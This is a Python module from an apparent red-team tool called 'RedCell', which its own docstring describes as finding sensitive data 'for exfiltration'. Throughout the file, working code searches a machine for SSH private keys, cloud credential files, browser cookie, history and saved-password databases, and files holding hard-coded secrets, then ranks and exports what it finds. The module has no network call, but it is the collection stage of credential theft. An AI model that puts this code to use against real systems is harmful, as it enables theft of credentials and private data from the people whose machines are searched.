"""
Data Discovery Module

Find and classify sensitive data for exfiltration.
"""

import os
import re
import sqlite3
import platform
from typing import List, Dict, Optional
from dataclasses import dataclass, asdict
from pathlib import Path
import json


@dataclass
class SensitiveFile:
    """Represents a discovered sensitive file."""

    file_path: str
    file_type: str
    size: int
    category: str
    confidence: str  # low, medium, high, critical
    description: str = ""

    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return asdict(self)


class DataDiscovery:
    """
    Discover sensitive data on target system.

    Categories:
    - Credentials (password files, private keys)
    - Documents (Office, PDF, text files)
    - Database files
    - Browser data (cookies, history, passwords)
    - Configuration files
    - Source code
    """

    # File extensions by category
    DOCUMENT_EXTENSIONS = [
        '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.pdf', '.odt', '.ods', '.odp', '.txt', '.rtf'
    ]

    CREDENTIAL_FILES = [
        'password', 'passwd', 'credentials', 'creds', 'secret',
        'private', 'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
        '.ssh', '.gnupg', '.aws', '.azure', 'wallet.dat'
    ]

    DATABASE_EXTENSIONS = [
        '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb',
        '.sql', '.dump', '.bak'
    ]

    CONFIG_EXTENSIONS = [
        '.conf', '.config', '.cfg', '.ini', '.yaml', '.yml',
        '.json', '.xml', '.env', '.properties'
    ]

    SOURCE_CODE_EXTENSIONS = [
        '.py', '.java', '.cpp', '.c', '.h', '.js', '.ts',
        '.go', '.rs', '.php', '.rb', '.sh', '.bat', '.ps1'
    ]

    # Sensitive patterns
    CREDENTIAL_PATTERNS = [
        r'password\s*[=:]\s*["\']?([^"\'\s]+)',
        r'api[_-]?key\s*[=:]\s*["\']?([^"\'\s]+)',
        r'secret[_-]?key\s*[=:]\s*["\']?([^"\'\s]+)',
        r'access[_-]?token\s*[=:]\s*["\']?([^"\'\s]+)',
        r'BEGIN\s+(?:RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY',
        r'-----BEGIN PRIVATE KEY-----',
    ]

    def __init__(self, verbose: bool = False):
        """
        Initialize data discovery.

        Args:
            verbose: Enable verbose output
        """
        self.verbose = verbose
        self.os_type = platform.system().lower()
        self.discovered_files: List[SensitiveFile] = []

    def search_directory(
        self,
        directory: str,
        max_depth: int = 5,
        follow_links: bool = False
    ) -> List[SensitiveFile]:
        """
        Search directory for sensitive files.

        Args:
            directory: Directory to search
            max_depth: Maximum depth to recurse
            follow_links: Follow symbolic links

        Returns:
            List of discovered sensitive files
        """
        if self.verbose:
            print(f"[*] Searching directory: {directory}")

        discovered = []

        try:
            for root, dirs, files in os.walk(directory, followlinks=follow_links):
                # Check depth
                depth = root[len(directory):].count(os.sep)
                if depth >= max_depth:
                    del dirs[:]
                    continue

                for filename in files:
                    file_path = os.path.join(root, filename)

                    # Skip if not accessible
                    if not os.path.isfile(file_path):
                        continue

                    # Classify file
                    sensitive_file = self._classify_file(file_path, filename)

                    if sensitive_file:
                        discovered.append(sensitive_file)
                        self.discovered_files.append(sensitive_file)

                        if self.verbose:
                            print(f"[+] Found: {file_path} ({sensitive_file.category})")

        except Exception as e:
            if self.verbose:
                print(f"[-] Error searching {directory}: {e}")

        return discovered

    def _classify_file(self, file_path: str, filename: str) -> Optional[SensitiveFile]:
        """
        Classify file by type and sensitivity.

        Args:
            file_path: Full path to file
            filename: Filename

        Returns:
            SensitiveFile or None
        """
        try:
            # Get file extension
            _, ext = os.path.splitext(filename)
            ext = ext.lower()

            # Get file size
            size = os.path.getsize(file_path)

            # Skip very large files (>100MB)
            if size > 100 * 1024 * 1024:
                return None

            filename_lower = filename.lower()

            # Check for credentials
            for cred_pattern in self.CREDENTIAL_FILES:
                if cred_pattern in filename_lower:
                    return SensitiveFile(
                        file_path=file_path,
                        file_type=ext or 'unknown',
                        size=size,
                        category='credentials',
                        confidence='high',
                        description=f'Potential credential file: {filename}'
                    )

            # Check for documents
            if ext in self.DOCUMENT_EXTENSIONS:
                return SensitiveFile(
                    file_path=file_path,
                    file_type=ext,
                    size=size,
                    category='documents',
                    confidence='medium',
                    description=f'Document file: {filename}'
                )

            # Check for databases
            if ext in self.DATABASE_EXTENSIONS:
                return SensitiveFile(
                    file_path=file_path,
                    file_type=ext,
                    size=size,
                    category='database',
                    confidence='high',
                    description=f'Database file: {filename}'
                )

            # Check for config files
            if ext in self.CONFIG_EXTENSIONS:
                # Scan content for credentials
                if self._contains_credentials(file_path):
                    return SensitiveFile(
                        file_path=file_path,
                        file_type=ext,
                        size=size,
                        category='credentials',
                        confidence='critical',
                        description=f'Config file with credentials: {filename}'
                    )

                return SensitiveFile(
                    file_path=file_path,
                    file_type=ext,
                    size=size,
                    category='configuration',
                    confidence='medium',
                    description=f'Configuration file: {filename}'
                )

            # Check for source code
            if ext in self.SOURCE_CODE_EXTENSIONS:
                # Check for hardcoded credentials
                if self._contains_credentials(file_path):
                    return SensitiveFile(
                        file_path=file_path,
                        file_type=ext,
                        size=size,
                        category='credentials',
                        confidence='high',
                        description=f'Source code with credentials: {filename}'
                    )

            return None

        except Exception as e:
            if self.verbose:
                print(f"[-] Error classifying {file_path}: {e}")
            return None

    def _contains_credentials(self, file_path: str) -> bool:
        """
        Check if file contains credential patterns.

        Args:
            file_path: Path to file

        Returns:
            True if credentials found
        """
        try:
            # Only scan text files
            if os.path.getsize(file_path) > 1024 * 1024:  # Skip files >1MB
                return False

            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

                for pattern in self.CREDENTIAL_PATTERNS:
                    if re.search(pattern, content, re.IGNORECASE):
                        return True

            return False

        except Exception:
            return False

    def discover_browser_data(self) -> List[SensitiveFile]:
        """
        Discover browser data (cookies, history, passwords).

        Returns:
            List of browser data files
        """
        if self.verbose:
            print("[*] Discovering browser data...")

        discovered = []

        # Browser data locations
        if 'windows' in self.os_type:
            user_profile = os.environ.get('USERPROFILE', '')

            browser_paths = [
                # Chrome
                os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default'),
                # Firefox
                os.path.join(user_profile, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
                # Edge
                os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default'),
            ]

        else:  # Linux/Mac
            home = os.path.expanduser('~')

            browser_paths = [
                # Chrome
                os.path.join(home, '.config', 'google-chrome', 'Default'),
                # Firefox
                os.path.join(home, '.mozilla', 'firefox'),
            ]

        browser_files = ['Cookies', 'History', 'Login Data', 'Web Data']

        for browser_path in browser_paths:
            if not os.path.exists(browser_path):
                continue

            for root, dirs, files in os.walk(browser_path):
                for filename in files:
                    if filename in browser_files or filename.endswith('.sqlite'):
                        file_path = os.path.join(root, filename)

                        try:
                            size = os.path.getsize(file_path)

                            sensitive_file = SensitiveFile(
                                file_path=file_path,
                                file_type='sqlite',
                                size=size,
                                category='browser_data',
                                confidence='critical',
                                description=f'Browser data: {filename}'
                            )

                            discovered.append(sensitive_file)
                            self.discovered_files.append(sensitive_file)

                            if self.verbose:
                                print(f"[+] Found browser data: {file_path}")

                        except Exception:
                            continue

        return discovered

    def discover_ssh_keys(self) -> List[SensitiveFile]:
        """
        Discover SSH private keys.

        Returns:
            List of SSH key files
        """
        if self.verbose:
            print("[*] Discovering SSH keys...")

        discovered = []

        # SSH directory
        if 'windows' in self.os_type:
            ssh_dir = os.path.join(os.environ.get('USERPROFILE', ''), '.ssh')
        else:
            ssh_dir = os.path.expanduser('~/.ssh')

        if not os.path.exists(ssh_dir):
            return discovered

        key_files = ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519']

        for key_file in key_files:
            key_path = os.path.join(ssh_dir, key_file)

            if os.path.exists(key_path):
                try:
                    size = os.path.getsize(key_path)

                    sensitive_file = SensitiveFile(
                        file_path=key_path,
                        file_type='private_key',
                        size=size,
                        category='credentials',
                        confidence='critical',
                        description=f'SSH private key: {key_file}'
                    )

                    discovered.append(sensitive_file)
                    self.discovered_files.append(sensitive_file)

                    if self.verbose:
                        print(f"[+] Found SSH key: {key_path}")

                except Exception:
                    continue

        return discovered

    def discover_cloud_credentials(self) -> List[SensitiveFile]:
        """
        Discover cloud provider credentials (AWS, Azure, GCP).

        Returns:
            List of cloud credential files
        """
        if self.verbose:
            print("[*] Discovering cloud credentials...")

        discovered = []

        if 'windows' in self.os_type:
            home = os.environ.get('USERPROFILE', '')
        else:
            home = os.path.expanduser('~')

        cloud_paths = [
            # AWS
            (os.path.join(home, '.aws', 'credentials'), 'AWS credentials'),
            (os.path.join(home, '.aws', 'config'), 'AWS config'),
            # Azure
            (os.path.join(home, '.azure', 'credentials'), 'Azure credentials'),
            # GCP
            (os.path.join(home, '.config', 'gcloud', 'credentials.db'), 'GCP credentials'),
        ]

        for file_path, description in cloud_paths:
            if os.path.exists(file_path):
                try:
                    size = os.path.getsize(file_path)

                    sensitive_file = SensitiveFile(
                        file_path=file_path,
                        file_type='credentials',
                        size=size,
                        category='credentials',
                        confidence='critical',
                        description=description
                    )

                    discovered.append(sensitive_file)
                    self.discovered_files.append(sensitive_file)

                    if self.verbose:
                        print(f"[+] Found cloud credentials: {file_path}")

                except Exception:
                    continue

        return discovered

    def discover_all(self, search_paths: List[str] = None) -> List[SensitiveFile]:
        """
        Discover all sensitive data.

        Args:
            search_paths: Optional list of paths to search

        Returns:
            List of all discovered files
        """
        print("[*] Starting comprehensive data discovery...")

        # Browser data
        self.discover_browser_data()

        # SSH keys
        self.discover_ssh_keys()

        # Cloud credentials
        self.discover_cloud_credentials()

        # Search common directories
        if search_paths is None:
            if 'windows' in self.os_type:
                user_profile = os.environ.get('USERPROFILE', '')
                search_paths = [
                    os.path.join(user_profile, 'Documents'),
                    os.path.join(user_profile, 'Desktop'),
                    os.path.join(user_profile, 'Downloads'),
                ]
            else:
                home = os.path.expanduser('~')
                search_paths = [
                    os.path.join(home, 'Documents'),
                    os.path.join(home, 'Desktop'),
                    os.path.join(home, 'Downloads'),
                ]

        for search_path in search_paths:
            if os.path.exists(search_path):
                self.search_directory(search_path, max_depth=3)

        return self.discovered_files

    def filter_by_category(self, category: str) -> List[SensitiveFile]:
        """
        Filter discovered files by category.

        Args:
            category: Category to filter by

        Returns:
            Filtered list of files
        """
        return [f for f in self.discovered_files if f.category == category]

    def filter_by_confidence(self, confidence: str) -> List[SensitiveFile]:
        """
        Filter discovered files by confidence level.

        Args:
            confidence: Confidence level (low, medium, high, critical)

        Returns:
            Filtered list of files
        """
        return [f for f in self.discovered_files if f.confidence == confidence]

    def get_total_size(self) -> int:
        """
        Get total size of discovered files in bytes.

        Returns:
            Total size in bytes
        """
        return sum(f.size for f in self.discovered_files)

    def generate_report(self) -> str:
        """
        Generate discovery report.

        Returns:
            Formatted report string
        """
        report = []
        report.append("=" * 80)
        report.append("DATA DISCOVERY REPORT")
        report.append("=" * 80)

        # Summary
        report.append(f"\nTotal files discovered: {len(self.discovered_files)}")
        report.append(f"Total size: {self.get_total_size() / (1024*1024):.2f} MB")

        # By category
        categories = {}
        for f in self.discovered_files:
            categories[f.category] = categories.get(f.category, 0) + 1

        report.append("\nBy Category:")
        for category, count in sorted(categories.items(), key=lambda x: x[1], reverse=True):
            report.append(f"  {category}: {count}")

        # By confidence
        confidence_levels = {}
        for f in self.discovered_files:
            confidence_levels[f.confidence] = confidence_levels.get(f.confidence, 0) + 1

        report.append("\nBy Confidence:")
        for confidence in ['critical', 'high', 'medium', 'low']:
            count = confidence_levels.get(confidence, 0)
            if count > 0:
                report.append(f"  {confidence.upper()}: {count}")

        # Critical findings
        critical_files = self.filter_by_confidence('critical')
        if critical_files:
            report.append("\n" + "=" * 80)
            report.append("CRITICAL FINDINGS")
            report.append("=" * 80)

            for i, f in enumerate(critical_files[:20], 1):
                report.append(f"\n[{i}] {f.file_path}")
                report.append(f"    Category: {f.category}")
                report.append(f"    Size: {f.size / 1024:.2f} KB")
                report.append(f"    Description: {f.description}")

        report.append("\n" + "=" * 80)
        return "\n".join(report)

    def export_json(self, filename: str):
        """
        Export discovered files to JSON.

        Args:
            filename: Output filename
        """
        data = {
            'total_files': len(self.discovered_files),
            'total_size': self.get_total_size(),
            'files': [f.to_dict() for f in self.discovered_files]
        }

        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

        print(f"[+] Exported {len(self.discovered_files)} files to {filename}")


def main():
    """Main function for standalone usage."""
    import argparse

    parser = argparse.ArgumentParser(description='RedCell Data Discovery')
    parser.add_argument('--search', nargs='+', help='Directories to search')
    parser.add_argument('--depth', type=int, default=3, help='Max search depth')
    parser.add_argument('--category', help='Filter by category')
    parser.add_argument('--confidence', help='Filter by confidence level')
    parser.add_argument('--export', help='Export to JSON file')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')

    args = parser.parse_args()

    discovery = DataDiscovery(verbose=args.verbose)

    # Discover all sensitive data
    if args.search:
        for search_path in args.search:
            discovery.search_directory(search_path, max_depth=args.depth)
    else:
        discovery.discover_all()

    # Filter if requested
    files = discovery.discovered_files

    if args.category:
        files = discovery.filter_by_category(args.category)
        print(f"\n[*] Filtered by category: {args.category}")

    if args.confidence:
        files = discovery.filter_by_confidence(args.confidence)
        print(f"\n[*] Filtered by confidence: {args.confidence}")

    # Generate report
    print("\n")
    print(discovery.generate_report())

    # Export if requested
    if args.export:
        discovery.export_json(args.export)


if __name__ == '__main__':
    main()
